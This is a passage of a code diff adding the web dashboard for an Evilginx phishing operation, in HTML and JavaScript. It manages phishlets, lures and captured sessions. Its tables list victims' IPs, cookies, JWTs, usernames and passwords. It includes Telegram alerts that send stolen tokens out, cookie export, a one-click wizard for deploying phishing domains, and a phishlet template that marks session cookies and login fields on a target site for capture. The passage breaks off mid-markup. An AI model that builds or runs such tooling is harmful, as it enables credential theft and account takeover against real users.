+    <div class="sess-loader" id="sessLoader"><div class="sess-ring"></div><div class="sess-loader-text">Loading sessions</div><div class="sess-dots"><span></span><span></span><span></span></div></div>
+    <div class="tbl-wrap"><table>
+    <thead><tr><th>ID</th><th>Phishlet</th><th>Remote IP</th><th>Cookies</th><th>JWT</th><th>Username</th><th>Password</th><th>Time</th><th>Actions</th></tr></thead>
+    <tbody id="sessionsBody"></tbody>
+  </table></div>
+  </div>
+</section>
+<section id="page-notifications" class="page">
+  <div class="sec-title"><i class="fa-solid fa-bell"></i> Notifications</div>
+  <div class="template-hint"><strong style="color:var(--accent)">i</strong> Connect a Telegram bot to receive real-time notifications when new sessions with tokens are captured. Only sessions with JWT or cookies will be sent.</div>
+  <div class="form-grid" style="max-width:600px">
+    <div class="field" style="grid-column:1/-1"><label>Telegram Bot Token <span class="hint" title="Create a bot via @BotFather and paste the token here">i</span></label><input id="ntfToken" placeholder="123456789:ABCdefGHIjklMNOpqrSTUvwxYZ"></div>
+    <div class="field" style="grid-column:1/-1"><label>Chat ID <span class="hint" title="Your Telegram user ID or group chat ID. Use @userinfobot to find yours">i</span></label><input id="ntfChatId" placeholder="123456789"></div>
+    <div style="grid-column:1/-1;display:flex;flex-direction:column;gap:14px;margin-top:4px">
+      <label class="toggle-row"><input type="checkbox" id="ntfEnabled" class="toggle-input"><span class="toggle-switch"></span><span class="toggle-label">Enable Notifications</span></label>
+      <label class="toggle-row"><input type="checkbox" id="ntfJwt" checked class="toggle-input"><span class="toggle-switch"></span><span class="toggle-label">Notify on JWT capture</span></label>
+      <label class="toggle-row"><input type="checkbox" id="ntfTokens" checked class="toggle-input"><span class="toggle-switch"></span><span class="toggle-label">Notify on any tokens / cookies</span></label>
+    </div>
+  </div>
+  <div style="margin-top:24px;display:flex;gap:10px;flex-wrap:wrap">
+    <button class="btn fill" onclick="saveNotifications()"><i class="fa-solid fa-floppy-disk"></i> Save Settings</button>
+    <button class="btn" id="ntfToggleBtn" onclick="toggleNotifications()"><i class="fa-solid fa-stop"></i> <span id="ntfToggleText">Stop</span></button>
+    <button class="btn cyan" onclick="testNotifications()"><i class="fa-solid fa-paper-plane"></i> Send Test</button>
+    <button class="btn" onclick="resetNotifications()"><i class="fa-solid fa-rotate-left"></i> Reset Sent IDs</button>
+  </div>
+  <div id="ntfStatus" style="margin-top:16px;color:var(--text3);font-size:13px;font-weight:500"></div>
+</section>
+<section id="page-terminal" class="page">
+  <div class="toolbar"><div class="sec-title" style="margin:0;border:0;padding:0"><i class="fa-solid fa-terminal"></i> Evilginx Terminal</div><div class="btn-group"><button class="btn fill" onclick="restartEvilginx()"><i class="fa-solid fa-arrows-rotate"></i> Restart</button><button class="btn danger" onclick="stopEvilginx()"><i class="fa-solid fa-stop"></i> Stop</button><button class="btn" onclick="startEvilginx()"><i class="fa-solid fa-play"></i> Start</button></div></div>
+  <div id="terminal-container"></div>
+</section>
+  </div>
+</div>
+</div>
+<div class="sidebar-overlay" id="sidebarOverlay" onclick="closeSidebar()"></div>
+<div class="modal-overlay" id="modalOverlay"><div class="modal"><div class="modal-head"><h3 id="modalTitle">MODAL</h3><button class="close" onclick="closeModal()">&times;</button></div><div id="modalBody"></div><div class="modal-foot" id="modalFoot"></div></div></div>
+<div class="toast-container" id="toasts"></div>
+<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
+<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@xterm/addon-fit@0.10.0/lib/addon-fit.min.js"></script>
+<script>
+const socket=io();let term,fitAddon,termReady=false;let allSessions=[],allPhishlets=[],allLures=[];
+const $=s=>document.querySelector(s);const $$=s=>document.querySelectorAll(s);
+const api=async(url,opts)=>{const r=await fetch(url,{headers:{'Content-Type':'application/json'},...opts});return r.json()};
+function toast(msg,type='ok'){const d=document.createElement('div');d.className='toast '+type;d.textContent=msg;$('#toasts').appendChild(d);setTimeout(()=>d.remove(),4000)}
+function ts(epoch){if(!epoch)return'\u2014';const d=new Date(epoch*1000);return d.toLocaleString('en-GB',{day:'2-digit',month:'short',hour:'2-digit',minute:'2-digit',second:'2-digit'})}
+function uptime(sec){const d=Math.floor(sec/86400),h=Math.floor(sec%86400/3600),m=Math.floor(sec%3600/60);return d>0?`${d}d ${h}h`:`${h}h ${m}m`}
+function esc(s){const el=document.createElement('span');el.textContent=s;return el.innerHTML}
+const pageNames={dashboard:'DASHBOARD',phishlets:'PHISHLETS',config:'CONFIGURATION',lures:'LURES',files:'FILE EXPLORER',services:'SERVICES',sessions:'SESSIONS',terminal:'TERMINAL',notifications:'NOTIFICATIONS'};
+function resizeCharts(){
+  try{if(chartTL)chartTL.resize();if(chartBD)chartBD.resize()}catch(e){}
+}
+function toggleSidebar(){
+  if(window.innerWidth<=768){
+    $('.sidebar').classList.toggle('open');
+    $('#sidebarOverlay').classList.toggle('show');
+  }else{
+    const app=$('.app');
+    app.classList.toggle('sb-closed');
+    try{localStorage.setItem('sb-closed', app.classList.contains('sb-closed')?'1':'0')}catch(e){}
+  }
+  setTimeout(resizeCharts, 80);
+  setTimeout(resizeCharts, 360);
+}
+function closeSidebar(){$('.sidebar').classList.remove('open');$('#sidebarOverlay').classList.remove('show')}
+function labelTable(tbody){
+  if(!tbody)return;
+  const table=tbody.closest('table');
+  if(!table)return;
+  const heads=[].map.call(table.querySelectorAll('thead th'),th=>th.textContent.trim());
+  tbody.querySelectorAll('tr').forEach(tr=>{
+    const tds=tr.children;
+    if(!tds.length)return;
+    if(tds.length===1 && tds[0].hasAttribute('colspan'))return;
+    for(let i=0;i<tds.length;i++) tds[i].setAttribute('data-label', heads[i]||'');
+  });
+}
+function bindCardTables(){document.querySelectorAll('.tbl-wrap tbody').forEach(labelTable)}
+$$('.sidebar nav a[data-page]').forEach(a=>{a.addEventListener('click',e=>{e.preventDefault();const pg=a.dataset.page;$$('.sidebar nav a').forEach(x=>x.classList.remove('active'));a.classList.add('active');$$('.page').forEach(p=>p.classList.remove('active'));$(`#page-${pg}`).classList.add('active');$('#pageTitle').textContent=pageNames[pg]||pg.toUpperCase();closeSidebar();if(pg==='dashboard')loadDashboard();if(pg==='phishlets')loadPhishlets();if(pg==='config')loadConfig();if(pg==='lures')loadLures();if(pg==='files')loadFiles();if(pg==='services')loadServices();if(pg==='sessions')loadSessions();if(pg==='notifications')loadNotifications();if(pg==='terminal')initTerminal()})});
+let chartTL=null,chartBD=null;
+function renderCharts(d){
+  const tl=d.chart_timeline||{labels:[],total:[],jwt:[],cookies:[],empty:[]};
+  const bd=d.chart_breakdown||{jwt:0,with_cookies:0,empty:0};
+  const ctx1=document.getElementById('chartTimeline');
+  const ctx2=document.getElementById('chartBreakdown');
+  if(!ctx1||!ctx2)return;
+  const labels=tl.labels.map(l=>{const p=l.split(' ');const dp=p[0].split('-');return dp[2]+'/'+dp[1]+' '+p[1]});
+  if(chartTL)chartTL.destroy();
+  chartTL=new Chart(ctx1,{type:'line',data:{labels,datasets:[{label:'Total',data:tl.total,borderColor:'#00ff88',backgroundColor:'rgba(0,255,136,0.08)',fill:true,tension:0.4,borderWidth:2,pointRadius:0,pointHoverRadius:5,pointHoverBackgroundColor:'#00ff88'},{label:'JWT',data:tl.jwt,borderColor:'#a78bfa',backgroundColor:'rgba(167,139,250,0.08)',fill:true,tension:0.4,borderWidth:2,pointRadius:0,pointHoverRadius:5,pointHoverBackgroundColor:'#a78bfa'},{label:'Cookies',data:tl.cookies,borderColor:'#22d3ee',backgroundColor:'rgba(34,211,238,0.08)',fill:true,tension:0.4,borderWidth:2,pointRadius:0,pointHoverRadius:5,pointHoverBackgroundColor:'#22d3ee'},{label:'Empty',data:tl.empty,borderColor:'#475569',backgroundColor:'rgba(71,85,105,0.08)',fill:true,tension:0.4,borderWidth:2,pointRadius:0,pointHoverRadius:5,pointHoverBackgroundColor:'#475569'}]},options:{responsive:true,maintainAspectRatio:false,interaction:{mode:'index',intersect:false},plugins:{legend:{display:true,position:'top',labels:{color:'#94a3b8',font:{family:'Inter',size:12},usePointStyle:true,pointStyle:'circle',padding:16}},tooltip:{backgroundColor:'rgba(10,14,23,0.95)',borderColor:'rgba(0,255,136,0.2)',borderWidth:1,titleColor:'#f1f5f9',bodyColor:'#94a3b8',titleFont:{family:'Inter',weight:'600'},bodyFont:{family:'JetBrains Mono',size:12},padding:12,cornerRadius:8}},scales:{x:{grid:{color:'rgba(255,255,255,0.04)',drawBorder:false},ticks:{color:'#475569',font:{size:10,family:'JetBrains Mono'},maxRotation:45,maxTicksLimit:12}},y:{grid:{color:'rgba(255,255,255,0.04)',drawBorder:false},ticks:{color:'#475569',font:{size:11,family:'JetBrains Mono'},precision:0},beginAtZero:true}}}});
+  if(chartBD)chartBD.destroy();
+  const bdTotal=bd.jwt+bd.with_cookies+bd.empty;
+  chartBD=new Chart(ctx2,{type:'doughnut',data:{labels:['JWT Captured','With Cookies','Empty'],datasets:[{data:[bd.jwt,bd.with_cookies,bd.empty],backgroundColor:['rgba(167,139,250,0.8)','rgba(34,211,238,0.8)','rgba(71,85,105,0.6)'],borderColor:['#a78bfa','#22d3ee','#475569'],borderWidth:2,hoverOffset:8}]},options:{responsive:true,maintainAspectRatio:false,cutout:'65%',plugins:{legend:{display:false},tooltip:{backgroundColor:'rgba(10,14,23,0.95)',borderColor:'rgba(0,255,136,0.2)',borderWidth:1,titleColor:'#f1f5f9',bodyColor:'#94a3b8',titleFont:{family:'Inter',weight:'600'},bodyFont:{family:'JetBrains Mono',size:13},padding:12,cornerRadius:8,callbacks:{label:function(c){const pct=bdTotal?((c.raw/bdTotal)*100).toFixed(1):'0';return' '+c.label+': '+c.raw+' ('+pct+'%)'}}}}}})
+  const leg=document.getElementById('breakdownLegend');
+  if(leg){const items=[{label:'JWT Captured',val:bd.jwt,color:'#a78bfa'},{label:'With Cookies',val:bd.with_cookies,color:'#22d3ee'},{label:'Empty',val:bd.empty,color:'#475569'}];leg.innerHTML=items.map(i=>{const pct=bdTotal?((i.val/bdTotal)*100).toFixed(1):'0';return `<div style="display:flex;align-items:center;gap:10px"><div style="width:10px;height:10px;border-radius:50%;background:${i.color};flex-shrink:0"></div><span style="flex:1;font-size:13px;color:var(--text2)">${i.label}</span><span style="font-family:var(--mono);font-size:13px;color:var(--text);font-weight:600">${i.val}</span><span style="font-size:12px;color:var(--text3)">${pct}%</span></div>`}).join('')}
+}
+async function loadDashboard(){const d=await api('/api/dashboard');$('#dPhishlets').textContent=d.active_phishlets;$('#dSessions').textContent=d.total_sessions;$('#dJwt').textContent=d.jwt_sessions;$('#dUptime').textContent=uptime(d.uptime);$('#topDomain').textContent=d.domain||'\u2014';$('#topIp').textContent=d.ipv4||'\u2014';updateEvStatus(d.ev_running);renderCharts(d);let jhtml='';(d.recent_jwt||[]).forEach(s=>{jhtml+=`<tr><td>${s.id}</td><td>${esc(s.phishlet)}</td><td>${esc(s.remote_addr)}</td><td>${esc(s.username||'—')}</td><td>${esc(s.password||'—')}</td><td>${ts(s.create_time)}</td><td><div class="btn-group"><button class="btn sm" onclick="viewSession(${s.id})"><i class="fa-solid fa-eye"></i> View</button><button class="btn sm danger" onclick="deleteSession(${s.id})"><i class="fa-solid fa-trash-can"></i></button></div></td></tr>`});if(!jhtml)jhtml='<tr><td colspan="6" style="text-align:center;color:var(--text3)">No JWT sessions yet</td></tr>';$('#recentJwtBody').innerHTML=jhtml}
+function updateEvStatus(running){const dot=$('#evDot'),lbl=$('#evLabel');if(running){dot.className='dot on';lbl.textContent='EVILGINX ONLINE';lbl.style.color='var(--accent)'}else{dot.className='dot off';lbl.textContent='EVILGINX OFFLINE';lbl.style.color='var(--red)'}}
+async function toggleNotifications(){var en=document.getElementById('ntfEnabled').checked;var r=await api('/api/notifications',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({enabled:!en})});if(r.ok){document.getElementById('ntfEnabled').checked=!en;toast(!en?'Notifications started':'Notifications stopped');updateNtfToggle(!en);loadNotifications()}else toast(r.error||'Error','err')}
+function updateNtfToggle(on){var btn=document.getElementById('ntfToggleBtn');var txt=document.getElementById('ntfToggleText');if(on){btn.className='btn danger';txt.textContent='Stop'}else{btn.className='btn fill';txt.textContent='Start'}}
+async function loadNotifications(){const s=await api('/api/notifications');$('#ntfToken').value=s.bot_token||'';$('#ntfChatId').value=s.chat_id||'';$('#ntfEnabled').checked=!!s.enabled;$('#ntfJwt').checked=s.notify_jwt!==false;$('#ntfTokens').checked=s.notify_tokens!==false;$('#ntfStatus').textContent='Status: '+(s.enabled?'ACTIVE':'DISABLED')+' | Sent notifications: '+(s.sent_count||0)}
+async function saveNotifications(){const data={bot_token:$('#ntfToken').value.trim(),chat_id:$('#ntfChatId').value.trim(),enabled:$('#ntfEnabled').checked,notify_jwt:$('#ntfJwt').checked,notify_tokens:$('#ntfTokens').checked};const r=await api('/api/notifications',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});if(r.ok){toast('Settings saved');loadNotifications()}else toast(r.error||'Error','err')}
+async function testNotifications(){await saveNotifications();const r=await api('/api/notifications/test',{method:'POST'});if(r.ok)toast('Test message sent to Telegram!');else toast(r.error||'Failed','err')}
+async function resetNotifications(){const r=await api('/api/notifications/reset',{method:'POST'});if(r.ok){toast('Sent IDs reset');loadNotifications()}else toast(r.error||'Error','err')}
+function downloadCookieJson(id){window.open('/api/sessions/'+id+'/cookies.json','_blank')}
+async function editPhishletCfg(name){const c=await api('/api/config');const g=c.general||{};const ph=c.phishlets||{};const pc=ph[name]||{};const lures=(await api('/api/lures')).filter(l=>l.phishlet===name);const lure=lures[0]||{};openModal('\u270f\ufe0f EDIT CONFIGURATION \u2014 '+name,`<div class="field"><label>Domain</label><input id="ecDomain" value="${g.domain||''}"></div><div class="field"><label>Phishlet Hostname</label><input id="ecHostname" value="${pc.hostname||''}"></div><div class="field"><label>IPv4 External</label><input id="ecIpv4" value="${g.external_ipv4||''}"></div><div class="field"><label>Lure Path</label><input id="ecLurePath" value="${lure.path||'/'}"></div><div class="field"><label>Blacklist Mode</label><select id="ecBlacklist" style="width:100%;padding:12px;background:var(--bg);color:var(--accent);border:1px solid var(--border);border-radius:8px;font-family:var(--mono)"><option value="off" ${(c.blacklist||{}).mode==='off'?'selected':''}>off</option><option value="unauth" ${(c.blacklist||{}).mode==='unauth'?'selected':''}>unauth</option><option value="full" ${(c.blacklist||{}).mode==='full'?'selected':''}>full</option></select></div>`,`<button class="btn fill" onclick="savePhishletCfg('${name}',${lure.index!==undefined?lure.index:-1})"><i class="fa-solid fa-floppy-disk"></i> SAVE</button><button class="btn" onclick="closeModal()">CANCEL</button>`)}
+async function savePhishletCfg(name,lureIdx){const domain=$('#ecDomain').value.trim();const hostname=$('#ecHostname').value.trim();const ipv4=$('#ecIpv4').value.trim();const lurePath=$('#ecLurePath').value.trim()||'/';const blacklist=$('#ecBlacklist').value;if(!domain){toast('Domain required','err');return}if(!ipv4){toast('IPv4 required','err');return}await api('/api/config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({domain,ipv4,blacklist_mode:blacklist,unauth_url:'https://'+domain})});await api('/api/phishlets/'+name,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({hostname:hostname||domain})});if(lureIdx>=0){await api('/api/lures',{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({index:lureIdx,path:lurePath})})}closeModal();openModal('\u2705 CONFIGURATION UPDATED',`<div style="line-height:2.2;padding:10px 0"><div><span style="color:var(--text3)">Phishlet:</span> <strong style="color:var(--cyan)">${name}</strong></div><div><span style="color:var(--text3)">Domain:</span> <span style="color:var(--accent)">${domain}</span></div><div><span style="color:var(--text3)">Hostname:</span> <span style="color:var(--accent)">${hostname||domain}</span></div><div><span style="color:var(--text3)">IPv4:</span> <span style="color:var(--accent)">${ipv4}</span></div><div><span style="color:var(--text3)">Lure path:</span> ${lurePath}</div><div style="margin-top:15px;padding:12px;background:var(--accent-dim);border:1px solid var(--accent);border-radius:8px;color:var(--yellow)">\u26a1 Restart evilginx to apply changes.</div></div>`,`<button class="btn fill" onclick="closeModal()">OK</button>`);loadConfig();loadPhishlets()}
+function openQuickSetup(){let phOpts='';allPhishlets.forEach(p=>{phOpts+=`<option value="${esc(p.name)}">${esc(p.name)}</option>`});openModal('\u26a1 QUICK SETUP',`<div class="template-hint"><strong style="color:var(--accent)">\u2139 This wizard runs:</strong> <code>config domain</code> \u2192 <code>phishlets hostname</code> \u2192 <code>config ipv4</code> \u2192 <code>lures create</code> \u2192 <code>blacklist</code> \u2192 <code>phishlets enable</code></div><div class="field"><label>Select Phishlet</label><select id="qsPhishlet" style="width:100%;padding:12px;background:var(--bg);color:var(--accent);border:1px solid var(--border);border-radius:8px;font-family:var(--mono)">${phOpts}</select></div><div class="field"><label>Domain</label><input id="qsDomain" placeholder="example.com"></div><div class="field"><label>Phishlet Hostname <span class="hint" title="Leave empty = same as domain">\u2139</span></label><input id="qsHostname" placeholder="same as domain if empty"></div><div class="field"><label>IPv4 External</label><input id="qsIpv4" placeholder="0.0.0.0"></div><div class="field"><label>Lure Path</label><input id="qsLurePath" value="/"></div><div class="field"><label>Blacklist Mode</label><select id="qsBlacklist" style="width:100%;padding:12px;background:var(--bg);color:var(--accent);border:1px solid var(--border);border-radius:8px;font-family:var(--mono)"><option value="off">off</option><option value="unauth">unauth</option><option value="full">full</option></select></div><div class="field"><label><input type="checkbox" id="qsEnable" checked style="margin-right:8px;accent-color:var(--accent)">Enable phishlet after setup</label></div>`,`<button class="btn fill" onclick="submitQuickSetup()"><i class="fa-solid fa-rocket"></i> DEPLOY</button><button class="btn" onclick="closeModal()">CANCEL</button>`);api('/api/config').then(c=>{let g=c.general||{};let d=document.getElementById('qsDomain');if(d)d.value=g.domain||'';let i=document.getElementById('qsIpv4');if(i)i.value=g.external_ipv4||'';let b=document.getElementById('qsBlacklist');if(b)b.value=(c.blacklist||{}).mode||'off'})}
+async function submitQuickSetup(){let ph=$('#qsPhishlet').value;let domain=$('#qsDomain').value.trim();let hostname=$('#qsHostname').value.trim()||domain;let ipv4=$('#qsIpv4').value.trim();let lurePath=$('#qsLurePath').value.trim()||'/';let blacklist=$('#qsBlacklist').value;let enable=$('#qsEnable').checked;if(!ph){toast('Select a phishlet','err');return}if(!domain){toast('Domain is required','err');return}if(!ipv4){toast('IPv4 is required','err');return}let r=await api('/api/quick-setup',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phishlet:ph,domain,hostname,ipv4,lure_path:lurePath,blacklist_mode:blacklist,enable})});if(r.error){toast('Error: '+r.error,'err');return}closeModal();openModal('\u2705 CONFIGURATION APPLIED',`<div style="line-height:2.2;padding:10px 0"><div><span style="color:var(--text3)">Phishlet:</span> <strong style="color:var(--cyan)">${ph}</strong></div><div><span style="color:var(--text3)">Domain:</span> <span style="color:var(--accent)">${domain}</span></div><div><span style="color:var(--text3)">Hostname:</span> <span style="color:var(--accent)">${hostname}</span></div><div><span style="color:var(--text3)">IPv4:</span> <span style="color:var(--accent)">${ipv4}</span></div><div><span style="color:var(--text3)">Lure path:</span> ${lurePath}</div>${r.lure_url?'<div><span style="color:var(--text3)">Lure URL:</span> <a href="'+r.lure_url+'" target="_blank" style="color:var(--cyan)">'+r.lure_url+'</a></div>':''}<div style="margin-top:15px;padding:12px;background:var(--accent-dim);border:1px solid var(--accent);border-radius:8px;color:var(--yellow)">\u26a1 Restart evilginx to activate the new configuration.</div></div>`,`<button class="btn fill" onclick="closeModal()">OK</button>`);loadConfig();loadPhishlets();loadLures()}
+async function toggleEvilginx(){const s=await api('/api/ev/status');if(s.running){toast('Stopping evilginx...');await api('/api/ev/stop',{method:'POST'})}else{toast('Starting evilginx...');await api('/api/ev/start',{method:'POST'})}setTimeout(checkEvCfg,1500)}
+async function checkEvCfg(){const s=await api('/api/ev/status');const btn=$('#evToggleBtn');const txt=$('#evToggleText');const dot=$('#evDotCfg');const lbl=$('#evLabelCfg');if(s.running){if(txt)txt.textContent='STOP';if(btn)btn.className='btn danger';if(dot)dot.className='dot on';if(lbl){lbl.textContent='ONLINE';lbl.style.color='var(--accent)'}}else{if(txt)txt.textContent='START';if(btn)btn.className='btn fill';if(dot)dot.className='dot off';if(lbl){lbl.textContent='OFFLINE';lbl.style.color='var(--red)'}}updateEvStatus(s.running)}
+async function restartEvilginxCfg(){toast('Restarting...');const r=await api('/api/ev/restart',{method:'POST'});if(r.ok){toast('Restarted');setTimeout(checkEvCfg,1500)}else{toast('Failed','err')}}
+function unconfigPhishlet(name){openModal('\u26a0\ufe0f DELETE CONFIGURATION',`<p style="color:var(--text2);margin-bottom:15px">Remove all configuration for <strong style="color:var(--cyan)">${name}</strong>?</p><p style="color:var(--text3);font-size:13px">This will reset hostname, disable the phishlet, and remove all associated lures. The phishlet YAML file will be kept.</p>`,`<button class="btn danger" onclick="doUnconfigPhishlet('${name}')"><i class="fa-solid fa-trash-can"></i> DELETE</button><button class="btn" onclick="closeModal()">CANCEL</button>`)}
+async function doUnconfigPhishlet(name){const r=await api('/api/phishlets/'+name+'/unconfigure',{method:'POST'});closeModal();if(r.ok){toast(name+' unconfigured');loadConfig();loadPhishlets();loadLures()}else{toast(r.error||'Error','err')}}
+function loadCfgPh(){var el=document.getElementById('cfgPhBody');if(!el)return;var h='';allPhishlets.forEach(p=>{h+=`<tr><td><strong style="color:var(--cyan)">${esc(p.name)}</strong></td><td>${esc(p.hostname||'\u2014')}</td><td>${p.enabled?'<span class="badge on">ENABLED</span>':'<span class="badge off">DISABLED</span>'}</td><td><div class="btn-group"><button class="btn sm" onclick="editPhishletCfg('${p.name}')"><i class="fa-solid fa-pen-to-square"></i></button><button class="btn sm ${p.enabled?'danger':'fill'}" onclick="togglePhishlet('${p.name}',${!p.enabled});setTimeout(()=>{loadPhishlets()},800)">${p.enabled?'Disable':'Enable'}</button><button class="btn sm danger" onclick="unconfigPhishlet('${p.name}')"><i class="fa-solid fa-trash-can"></i></button></div></td></tr>`});if(!h)h='<tr><td colspan="4" style="text-align:center;color:var(--text3)">No phishlets</td></tr>';el.innerHTML=h}
+
+async function loadPhishlets(){allPhishlets=await api('/api/phishlets');let html='';allPhishlets.forEach(p=>{html+=`<tr><td><strong style="color:var(--cyan)">${esc(p.name)}</strong></td><td>${esc(p.author||'\u2014')}</td><td>${esc(p.hostname||'\u2014')}</td><td>${p.enabled?'<span class="badge on">ENABLED</span>':'<span class="badge off">DISABLED</span>'}</td><td>${p.visible?'<span class="badge on">YES</span>':'<span class="badge off">HIDDEN</span>'}</td><td><div class="btn-group"><button class="btn sm" onclick="editPhishlet('${p.name}')"><i class="fa-solid fa-pen-to-square"></i></button><button class="btn sm ${p.enabled?'danger':'fill'}" onclick="togglePhishlet('${p.name}',${!p.enabled})">${p.enabled?'Disable':'Enable'}</button><button class="btn sm danger" onclick="deletePhishlet('${p.name}')"><i class="fa-solid fa-trash-can"></i></button></div></td></tr>`});if(!html)html='<tr><td colspan="6"><div class="empty"><i class="fa-solid fa-fish-fins"></i><p>No phishlets</p></div></td></tr>';$('#phishletsBody').innerHTML=html;loadCfgPh()}
+function openNewPhishlet(){openModal('NEW PHISHLET',`<div class="template-hint"><strong style="color:var(--accent)">i Phishlet YAML template:</strong> <code>proxy_hosts</code> \u2014 target domain | <code>auth_tokens</code> \u2014 cookies to capture | <code>credentials</code> \u2014 login fields | <code>login.path</code> \u2014 login page</div><div class="field"><label>Phishlet Name</label><input id="newPhName" placeholder="mysite"></div><div class="field" style="margin-top:12px"><label>YAML Content</label><textarea id="newPhYaml">author: '@Custom'\nmin_ver: '2.3.0'\n\nproxy_hosts:\n  - {phish_sub: '', orig_sub: '', domain: 'TARGET.COM', session: true, is_landing: true}\n\nsub_filters:\n  - triggers_on: 'TARGET.COM'\n    orig_sub: ''\n    domain: 'TARGET.COM'\n    search: 'TARGET.COM'\n    replace: '{hostname}'\n    mimes: ['text/html', 'application/json']\n\nauth_tokens:\n  - domain: '.TARGET.COM'\n    keys:\n      - 'SESSION_COOKIE'\n\ncredentials:\n  username:\n    key: 'email'\n    search: '(.*)'\n    type: 'post'\n  password:\n    key: 'password'\n    search: '(.*)'\n    type: 'post'\n\nlogin:\n  domain: 'TARGET.COM'\n  path: '/login'</textarea></div>`,`<button class="btn fill" onclick="createPhishlet()">CREATE</button> <button class="btn" onclick="closeModal()">CANCEL</button>`)}
+async function createPhishlet(){const name=$('#newPhName').value.trim();const content=$('#newPhYaml').value;if(!name)return toast('Enter a name','err');const r=await api('/api/phishlets',{method:'POST',body:JSON.stringify({name,content})});if(r.ok){closeModal();toast('Phishlet created');loadPhishlets()}else toast(r.error||'Error','err')}
+async function editPhishlet(name){const r=await api(`/api/phishlets/${name}`);if(r.error)return toast(r.error,'err');const p=allPhishlets.find(x=>x.name===name)||{};openModal(`EDIT: ${name}`,`<div class="form-grid"><div class="field"><label>Hostname <span class="hint" title="phishlets hostname ${name} YOUR.DOMAIN">i</span></label><input id="edPhHost" value="${esc(p.hostname||'')}"></div><div class="field"><label>Unauth URL</label><input id="edPhUnauth" value="${esc(p.unauth_url||'')}"></div></div><div class="field" style="margin-top:12px"><label>YAML Source</label><textarea id="edPhYaml" style="min-height:350px">${esc(r.content)}</textarea></div>`,`<button class="btn fill" onclick="savePhishlet('${name}')">SAVE</button> <button class="btn" onclick="closeModal()">CANCEL</button>`)}
+async function savePhishlet(name){const data={hostname:$('#edPhHost').value,unauth_url:$('#edPhUnauth').value,content:$('#edPhYaml').value};const r=await api(`/api/phishlets/${name}`,{method:'PUT',body:JSON.stringify(data)});if(r.ok){closeModal();toast('Saved. Restart to apply.');loadPhishlets()}else toast(r.error||'Error','err')}
+async function togglePhishlet(name,enable){const r=await api(`/api/phishlets/${name}/toggle`,{method:'POST',body:JSON.stringify({enable})});if(r.ok){toast(`${name} ${enable?'enabled':'disabled'}`);loadPhishlets();loadCfgPh()}else toast(r.error||'Error','err')}
+async function deletePhishlet(name){if(!confirm(`Delete phishlet "${name}"?`))return;const r=await api(`/api/phishlets/${name}`,{method:'DELETE'});if(r.ok){toast('Deleted');loadPhishlets()}else toast(r.error||'Error','err')}
+async function loadConfig(){if(!allPhishlets.length)allPhishlets=await api('/api/phishlets');loadCfgPh();checkEvCfg()}
+async function saveConfig(){const data={domain:$('#cfgDomain').value,ipv4:$('#cfgIpv4').value,https_port:parseInt($('#cfgHttps').value)||443,dns_port:parseInt($('#cfgDns').value)||53,unauth_url:$('#cfgUnauth').value,blacklist_mode:$('#cfgBlacklist').value,autocert:$('#cfgAutocert').value==='true'};const r=await api('/api/config',{method:'POST',body:JSON.stringify(data)});if(r.ok)toast(r.msg||'Config saved');else toast(r.error||'Error','err')}
+async function loadLures(){allLures=await api('/api/lures');let html='';allLures.forEach((l,i)=>{html+=`<tr><td>${i}</td><td><span style="color:var(--cyan)">${esc(l.phishlet)}</span></td><td>${esc(l.path||'/')}</td><td style="max-width:300px"><code style="color:var(--accent);font-size:12px;word-break:break-all">${esc(l.url||'\u2014')}</code></td><td>${l.paused?'<span class="badge off">PAUSED</span>':'<span class="badge on">ACTIVE</span>'}</td><td><div class="btn-group"><button class="btn sm" onclick="editLure(${i})"><i class="fa-solid fa-pen-to-square"></i></button><button class="btn sm" onclick="copyUrl('${esc(l.url||'')}')" ><i class="fa-solid fa-copy"></i> URL</button><button class="btn sm danger" onclick="deleteLure(${i})"><i class="fa-solid fa-trash-can"></i></button></div></td></tr>`});if(!html)html='<tr><td colspan="6"><div class="empty"><i class="fa-solid fa-link"></i><p>No lures</p></div></td></tr>';$('#luresBody').innerHTML=html}
+function openNewLure(){let phOpts=allPhishlets.map(p=>`<option value="${p.name}">${p.name}</option>`).join('');if(!phOpts)phOpts='<option value="">\u2014 load phishlets first \u2014</option>';openModal('NEW LURE',`<div class="template-hint"><strong style="color:var(--accent)">i</strong> Pick a phishlet and set the URL path.</div><div class="form-grid"><div class="field"><label>Phishlet</label><select id="nlPhishlet">${phOpts}</select></div><div class="field"><label>Path</label><input id="nlPath" value="/"></div><div class="field"><label>Redirect URL</label><input id="nlRedirect" placeholder="https://real-site.com"></div><div class="field"><label>UA Filter</label><input id="nlUa" placeholder=""></div></div>`,`<button class="btn fill" onclick="createLure()">CREATE</button> <button class="btn" onclick="closeModal()">CANCEL</button>`)}
+async function createLure(){const data={phishlet:$('#nlPhishlet').value,path:$('#nlPath').value||'/',redirect_url:$('#nlRedirect').value,ua_filter:$('#nlUa').value};const r=await api('/api/lures',{method:'POST',body:JSON.stringify(data)});if(r.ok){closeModal();toast('Lure created');loadLures()}else toast(r.error||'Error','err')}
+function editLure(idx){const l=allLures[idx];if(!l)return;let phOpts=allPhishlets.map(p=>`<option value="${p.name}" ${p.name===l.phishlet?'selected':''}>${p.name}</option>`).join('');openModal(`EDIT LURE #${idx}`,`<div class="form-grid"><div class="field"><label>Phishlet</label><select id="elPhishlet">${phOpts}</select></div><div class="field"><label>Path</label><input id="elPath" value="${esc(l.path||'/')}"></div><div class="field"><label>Redirect URL</label><input id="elRedirect" value="${esc(l.redirect_url||'')}"></div><div class="field"><label>UA Filter</label><input id="elUa" value="${esc(l.ua_filter||'')}"></div><div class="field"><label>OG Title</label><input id="elOgTitle" value="${esc(l.og_title||'')}"></div><div class="field"><label>OG Description</label><input id="elOgDesc" value="${esc(l.og_desc||'')}"></div><div class="field"><label>OG Image</label><input id="elOgImg" value="${esc(l.og_image||'')}"></div><div class="field"><label>OG URL</label><input id="elOgUrl" value="${esc(l.og_url||'')}"></div></div>`,`<button class="btn fill" 